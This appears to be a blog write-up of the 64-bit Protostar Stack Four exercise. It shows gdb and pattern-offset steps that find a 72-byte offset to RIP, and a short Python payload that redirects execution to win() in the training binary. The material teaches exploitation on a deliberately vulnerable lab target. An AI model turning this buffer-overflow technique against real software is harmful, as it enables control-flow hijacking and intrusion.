<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar x64 - Stack Four</strong></h1>
        <a href="https://exploit.education/protostar/stack-four/">https://exploit.education/protostar/stack-four/</a><br>
        NOTE 1: Protostar doesn't offer 64-bit versions of the challenges itself. I set it up myself. For setup, refer <a href="../vm-setup/vm-setup.html">here</a><br>
        NOTE 2: I'm writing the 64-bit write-ups as follow-ups to the 32-bit challenges, so I won't be going over the intricacies of the exploit, just the differences involved with it now being a 64-bit challenge instead of 32-bit<br>
        <br>
        <img alt="images\6-1.png" src="images/6-1.png"><br>
        <br>
        The goal of Stack Four is to overflow the <code>buffer</code> variable and overwrite RIP and redirect code execution to the <code>win()</code> function.<br>
        <br>
        <strong></strong>
        <h2><strong>objdump</strong></h2><br>
        Find the address of the <code>win()</code> function with objdump.<br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack4&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;win<br>
                0000000000400544&nbsp;&lt;win&gt;<span style="color:#ff9d00;font-weight:700">:</span>
            </div>
        </div><br>
        <br>
        <code>win()</code> is located at <code>0x00400544</code>.<br>
        To overwrite RIP with the addres of win(), we need to find the offset to RIP.<br>
        <br>
        <strong></strong>
        <h2><strong>Overwrite Instruction Pointer - 32-bit vs 64-bit</strong></h2><br>
        RIP is the 64-bit version of EIP.<br>
        <br>
        With 64bit binaries, you'll never get a RIP overwrite like you would with 32bit buffer overflows.<br>
        Instead, you'll see that RIP crashes pointing to a return address:<br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;gdb&nbsp;-q&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack4&nbsp;<br>
                Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack4...<span style="color:#ff9d00;font-weight:700">(</span>no&nbsp;debugging&nbsp;symbols&nbsp;found<span style="color:#ff9d00;font-weight:700">)</span>...done.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
                Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack4&nbsp;<br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
                <br>
                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
                0x0000000000400570&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ffdd00;font-weight:400">main&nbsp;()</span>
            </div>
        </div><br>
        <br>
        To determine the offset to overwrite RIP, you can examine the value which RSP points to (RSP points to the top of the stack).<br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;x<span style="color:#ff9d00;font-weight:700">/</span>xg&nbsp;<span style="color:#7f0044;font-weight:400">$rsp</span><br>
                0x7fffffffe558<span style="color:#ff9d00;font-weight:700">:</span> 0x6341356341346341
            </div>
        </div><br>
        <br>
        There's part of our cyclic pattern - <code>0x6341356341346341</code>.<br>
        <br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar-x64]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_offset&nbsp;-q&nbsp;0x6341356341346341</span><br>
                [*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;72
            </div>
        </div><br>
        <br>
        The offset to overwrite RIP is <code>72</code> bytes.<br>
        <br>
        <strong></strong>
        <h2><strong>Write Exploit</strong></h2><br>
        With the offset to overwrite RIP and the address of win(), we can write our exploit.<br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;Two</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">72</span><br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">buffer</span><br>
                payload&nbsp;+=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400544</span>)<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;python&nbsp;stack4.py&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack4<br>
                code&nbsp;flow&nbsp;successfully&nbsp;changed<br>
                Segmentation&nbsp;fault&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>core&nbsp;dumped<span style="color:#ff9d00;font-weight:700">)</span>
            </div>
        </div>
    </writeup>
</section>
</body>
</html>